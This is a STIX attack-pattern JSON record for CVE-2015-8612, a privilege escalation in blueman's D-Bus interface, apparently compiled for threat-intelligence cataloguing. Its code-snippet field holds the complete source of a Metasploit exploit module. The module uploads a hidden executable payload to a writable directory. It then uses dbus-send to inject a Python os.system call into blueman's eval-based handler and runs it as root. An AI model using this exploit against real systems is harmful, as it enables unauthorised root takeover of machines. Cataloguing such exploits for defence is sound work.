{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--8beba433-3be9-4eb6-86d9-f1bff5994e36",
    "created": "2024-08-14T16:59:41.393565Z",
    "modified": "2024-08-14T16:59:41.393569Z",
    "name": "blueman set_dhcp_handler D-Bus Privilege Escalation",
    "description": " This module attempts to gain root privileges by exploiting a Python code injection vulnerability in blueman versions prior to 2.0.3.  The `org.blueman.Mechanism.EnableNetwork` D-Bus interface exposes the `set_dhcp_handler` function which uses user input in a call to `eval` without sanitization, resulting in arbitrary code execution as root.  This module has been tested successfully with blueman version 1.23 on Debian 8 Jessie (x64).  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/local/blueman_set_dhcp_handler_dbus_priv_esc.rb",
            "external_id": "blueman_set_dhcp_handler_dbus_priv_esc.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2015-8612"
        },
        {
            "source_name": "reference",
            "url": "https://twitter.com/thegrugq/status/677809527882813440"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/blueman-project/blueman/issues/416"
        },
        {
            "source_name": "reference",
            "url": "https://www.openwall.com/lists/oss-security/2015/12/18/6"
        },
        {
            "source_name": "reference",
            "url": "https://www.debian.org/security/2015/dsa-3427"
        },
        {
            "source_name": "reference",
            "url": "https://bugs.mageia.org/show_bug.cgi?id=17361"
        },
        {
            "source_name": "reference",
            "url": "http://www.slackware.com/security/viewer.php?l=slackware-security&y=2015&m=slackware-security.421085"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = ExcellentRanking\n\n  include Msf::Post::File\n  include Msf::Post::Linux::Priv\n  include Msf::Post::Linux::System\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'blueman set_dhcp_handler D-Bus Privilege Escalation',\n      'Description'    => %q{\n        This module attempts to gain root privileges by exploiting a Python\n        code injection vulnerability in blueman versions prior to 2.0.3.\n\n        The `org.blueman.Mechanism.EnableNetwork` D-Bus interface exposes the\n        `set_dhcp_handler` function which uses user input in a call to `eval`,\n        without sanitization, resulting in arbitrary code execution as root.\n\n        This module has been tested successfully with blueman version 1.23\n        on Debian 8 Jessie (x64).\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Sebastian Krahmer', # Discovery and exploit\n          'bcoles'             # Metasploit\n        ],\n      'DisclosureDate' => '2015-12-18',\n      'References'     =>\n        [\n          ['BID', '79688'],\n          ['CVE', '2015-8612'],\n          ['URL', 'https://twitter.com/thegrugq/status/677809527882813440'],\n          ['URL', 'https://github.com/blueman-project/blueman/issues/416'],\n          ['URL', 'https://www.openwall.com/lists/oss-security/2015/12/18/6'],\n          ['URL', 'https://www.debian.org/security/2015/dsa-3427'],\n          ['URL', 'https://bugs.mageia.org/show_bug.cgi?id=17361'],\n          ['URL', 'http://www.slackware.com/security/viewer.php?l=slackware-security&y=2015&m=slackware-security.421085']\n        ],\n      'Platform'       => ['linux'],\n      'Arch'           =>\n        [\n          ARCH_X86,\n          ARCH_X64,\n          ARCH_ARMLE,\n          ARCH_AARCH64,\n          ARCH_PPC,\n          ARCH_MIPSLE,\n          ARCH_MIPSBE\n        ],\n      'SessionTypes'   => ['shell', 'meterpreter'],\n      'Targets'        => [['Auto', {}]],\n      'DefaultTarget'  => 0))\n    register_advanced_options [\n      OptString.new('WritableDir', [true, 'A directory where we can write files', '/tmp'])\n    ]\n  end\n\n  def base_dir\n    datastore['WritableDir'].to_s\n  end\n\n  def upload(path, data)\n    print_status \"Writing '#{path}' (#{data.size} bytes) ...\"\n    rm_f path\n    write_file path, data\n    register_file_for_cleanup path\n  end\n\n  def upload_and_chmodx(path, data)\n    upload path, data\n    chmod path\n  end\n\n  def dbus_send(dest:, type:, path:, interface:, contents:)\n    cmd_exec \"dbus-send --system --print-reply --dest=#{dest} --type=#{type} #{path} #{interface} #{contents}\"\n  end\n\n  def check\n    unless command_exists? 'dbus-send'\n      vprint_error 'dbus-send is not installed. Exploitation will fail.'\n      return CheckCode::Safe\n    end\n    vprint_good 'dbus-send is installed'\n\n    res = dbus_send(\n      dest: 'org.blueman.Mechanism',\n      type: 'method_call',\n      path: '/',\n      interface: 'org.freedesktop.DBus.Introspectable.Introspect',\n      contents: ''\n    )\n\n    unless res.include? 'EnableNetwork'\n      vprint_error 'org.blueman.Mechanism.EnableNetwork D-Bus interface is not available'\n      return CheckCode::Safe\n    end\n    vprint_good 'org.blueman.Mechanism.EnableNetwork D-Bus interface is available'\n\n    res = execute_python('')\n    unless res.include? 'eval(\"nc.set_dhcp_handler(%s)\" % dhcp_handler)'\n      vprint_error 'Target is not vulnerable'\n      return CheckCode::Safe\n    end\n\n    CheckCode::Vulnerable\n  end\n\n  def execute_python(code)\n    dbus_send(\n      dest: 'org.blueman.Mechanism',\n      type: 'method_call',\n      path: '/',\n      interface: 'org.blueman.Mechanism.EnableNetwork',\n      contents: \"'string:[]' 'string:[]' 'string:#{code}'\"\n    )\n  end\n\n  def exploit\n    if !datastore['ForceExploit'] && is_root?\n      fail_with(Failure::BadConfig, 'Session already has root privileges. Set ForceExploit to override.')\n    end\n\n    unless writable? base_dir\n      fail_with Failure::BadConfig, \"#{base_dir} is not writable\"\n    end\n\n    payload_name = \".#{rand_text_alphanumeric 10..15}\"\n    payload_path = \"#{base_dir}/#{payload_name}\"\n    upload_and_chmodx payload_path, generate_payload_exe\n\n    print_status 'Executing payload...'\n    res = execute_python \"os.system(\\\"#{payload_path}&\\\")\"\n    vprint_line res\n\n    unless res.include? 'eval(\"nc.set_dhcp_handler(%s)\" % dhcp_handler)'\n      fail_with Failure::NotVulnerable, 'The target is not vulnerable'\n    end\n\n    if res.include? 'SyntaxError:'\n      fail_with Failure::Unknown, 'Payload execution failed due to syntax error'\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2015-12-18",
    "x_mitre_platforms": [
        "['linux']"
    ]
}